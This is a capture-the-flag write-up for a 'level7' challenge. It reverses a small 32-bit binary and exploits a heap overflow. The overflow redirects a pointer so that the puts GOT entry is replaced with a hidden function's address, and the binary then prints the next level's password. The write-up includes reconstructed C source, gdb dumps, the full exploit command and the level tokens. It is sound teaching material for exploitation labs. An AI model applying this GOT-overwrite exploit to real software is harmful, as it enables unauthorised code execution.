# Level7 -

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level7 | `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d` |
| level8 | `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute level7

```shell
./level7
> Segmentation fault (core dumped)

./level7 a
> Segmentation fault (core dumped)

./level7 a b
> ~~
```

The program seems take two arguments

Lets debug the binary

```shell
(gdb) info functions
0x080484f4  m
0x08048521  main
```

See our assembly interpretation in [source file](../source.c)

```C
char c[0x44];

typedef struct s_struct
{
    int n;
    void *ptr;
} t_struct;

void m(char *str)
{
    time_t seconds;

    seconds = time(0);
    printf("%s - %d\n", c, seconds);
}

int main(int argc, char **argv)
{
    t_struct *s_arg1;
    t_struct *s_arg2;

    int i = 0;
    s_arg1 = (void *)malloc(0x8);
    s_arg1->n = 1;
    s_arg1->ptr = (void *)malloc(0x8);
    s_arg2 = (void *)malloc(0x8);
    s_arg2->n = 2;
    s_arg2->ptr = (void *)malloc(0x8);

    strcpy(s_arg1->ptr, argv[1]);
    strcpy(s_arg2->ptr, argv[2]);
    fgets(c, 0x44, fopen("/home/user/level8/.pass", "r"));
    puts("~~");
}
```

The program takes two arguments. Those arguments are copied inside two pointers.
Then, the pass file is readed and stored inside a global variable. Unfortunately, this global variable is not readed. This work is done by a function `m` that is not called. Our job is to call the m-function after `fgets` syscall.

The idea would be to replace the address of `puts` in the Global Offset Table (GOT) with the `m-function` address.

Lets gets `puts` address in GOT and `m-function` address.

```bash
# puts address
objdump -R ./level7  | grep puts
> 08049928 R_386_JUMP_SLOT   puts

# m address
objdump -t ./level7  | grep -w m
> 080484f4 g     F .text  0000002d              m
```

```
run AAAAAAAA BBBBBBBB

# Before 1st strcpy
[-------------------------------------code-------------------------------------]
   0x8048596 <main+117>:        mov    eax,DWORD PTR [eax+0x4]
   0x8048599 <main+120>:        mov    DWORD PTR [esp+0x4],edx
   0x804859d <main+124>:        mov    DWORD PTR [esp],eax
=> 0x80485a0 <main+127>:        call   0x80483e0 <strcpy@plt>
   0x80485a5 <main+132>:        mov    eax,DWORD PTR [ebp+0xc]
   0x80485a8 <main+135>:        add    eax,0x8
   0x80485ab <main+138>:        mov    eax,DWORD PTR [eax]
   0x80485ad <main+140>:        mov    edx,eax
Guessed arguments:
arg[0]: 0x804a018 --> 0x0          -> s_arg1->ptr
arg[1]: 0xbffff838 ("AAAAAAAA")    -> argv[1]
[------------------------------------stack-------------------------------------]

gdb-peda$ x/20 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018 -> s_arg1->ptr*
                                                  _______________________|
                                                  |
0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000


ni
# After 1st strcpy

x/20x 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
                                                  _______________________|
                                                  |
0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000

# Before 2nd strcpy
[-------------------------------------code-------------------------------------]
   0x80485b3 <main+146>:        mov    eax,DWORD PTR [eax+0x4]
   0x80485b6 <main+149>:        mov    DWORD PTR [esp+0x4],edx
   0x80485ba <main+153>:        mov    DWORD PTR [esp],eax
=> 0x80485bd <main+156>:        call   0x80483e0 <strcpy@plt>
   0x80485c2 <main+161>:        mov    edx,0x80486e9
   0x80485c7 <main+166>:        mov    eax,0x80486eb
   0x80485cc <main+171>:        mov    DWORD PTR [esp+0x4],edx
   0x80485d0 <main+175>:        mov    DWORD PTR [esp],eax
Guessed arguments:
arg[0]: 0x804a038 --> 0x0
arg[1]: 0xbffff841 ("BBBBBBBB")

ni
# After 1st strcpy

x/20x 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
                                                  _______________________|
                                                  |
0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
                                                  _______________________|
                                                  |
0x804a030:      0x00000000      0x00000011      0x42424242      0x42424242
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
```

```shell
b*0x080485bd # before 2nd strcpy
run $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
x/20x 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x08049928
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000

ni
x/20x 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x08049928
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000

x/x 0x08049928
0x8049928 <puts@got.plt>:       0x080484f4
```

```bash
~/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1604570728 # time (useless)
```

---

## Sources

### Format string vulnerability

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
- [FR - Buffer overflow](https://beta.hackndo.com/buffer-overflow/)

### Shell

- [Man malloc](https://linux.die.net/man/3/malloc)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man strcpy](https://linux.die.net/man/3/strcpy)
- [Man fopen](https://linux.die.net/man/3/fopen)
- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man time]()
- [Man printf]()
